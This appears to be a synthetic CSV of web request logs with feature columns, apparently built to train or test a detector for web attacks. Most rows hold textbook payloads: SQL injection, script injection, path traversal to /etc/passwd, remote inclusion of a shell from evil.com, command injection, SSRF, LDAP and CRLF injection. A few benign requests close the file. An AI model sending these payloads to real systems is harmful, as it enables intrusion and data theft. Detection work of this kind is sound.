timestamp,source_ip,method,url,full_url,status_code,user_agent,referrer,scheme,host,path,query_string,file_extension,source,url_length,special_characters,has_sql_keyword,has_script,has_traversal
2026-04-08T10:01:12,192.168.1.10,GET,/login?id=1 OR 1=1--,/login?id=1 OR 1=1--,,,,http,,/login,id=1%20OR%201%3D1--,,ipdr,20,8,1,0,0
2026-04-08T10:02:45,192.168.1.11,GET,/search?q=<script>alert(1)</script>,/search?q=<script>alert(1)</script>,,,,http,,/search,q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,ipdr,35,10,0,1,0
2026-04-08T10:03:21,192.168.1.12,GET,/download?file=../../etc/passwd,/download?file=../../etc/passwd,,,,http,,/download,file=..%2F..%2Fetc%2Fpasswd,,ipdr,31,10,0,0,1
2026-04-08T10:04:55,192.168.1.13,GET,/index.php?page=../../etc/passwd,/index.php?page=../../etc/passwd,,,,http,,/index.php,page=..%2F..%2Fetc%2Fpasswd,php,ipdr,32,11,0,0,1
2026-04-08T10:05:30,192.168.1.14,GET,/index.php?page=http://evil.com/shell.php,/index.php?page=http://evil.com/shell.php,,,,http,,/index.php,page=http%3A%2F%2Fevil.com%2Fshell.php,php,ipdr,41,10,0,0,0
2026-04-08T10:06:10,192.168.1.15,GET,/ping?ip=127.0.0.1;whoami,/ping?ip=127.0.0.1;whoami,,,,http,,/ping,ip=127.0.0.1%3Bwhoami,,ipdr,25,7,0,0,0
2026-04-08T10:07:05,192.168.1.16,GET,/fetch?url=http://127.0.0.1/admin,/fetch?url=http://127.0.0.1/admin,,,,http,,/fetch,url=http%3A%2F%2F127.0.0.1%2Fadmin,,ipdr,33,10,0,0,0
2026-04-08T10:08:22,192.168.1.17,POST,/xml,/xml,,,,http,,/xml,,,ipdr,4,1,0,0,0
2026-04-08T10:09:40,192.168.1.18,GET,/login?user=*)(|(user=*)),/login?user=*)(|(user=*)),,,,http,,/login,user=%2A%29%28%7C%28user%3D%2A%29%29,,ipdr,25,12,0,0,0
2026-04-08T10:10:12,192.168.1.19,GET,/page?name=abc%0d%0aSet-Cookie:malicious=true,/page?name=abc%0d%0aSet-Cookie:malicious=true,,,,http,,/page,name=abc%0D%0ASet-Cookie%3Amalicious%3Dtrue,,ipdr,41,8,0,0,0
2026-04-08T10:11:55,192.168.1.20,POST,/login,/login,,,,http,,/login,,,ipdr,6,1,0,0,0
2026-04-08T10:12:30,192.168.1.21,POST,/transfer,/transfer,,,,http,,/transfer,,,ipdr,9,1,0,0,0
2026-04-08T10:13:10,192.168.1.22,GET,/api,/api,,,,http,,/api,,,ipdr,4,1,0,0,0
2026-04-08T10:14:05,192.168.1.23,GET,/home,/home,,,,http,,/home,,,ipdr,5,1,0,0,0
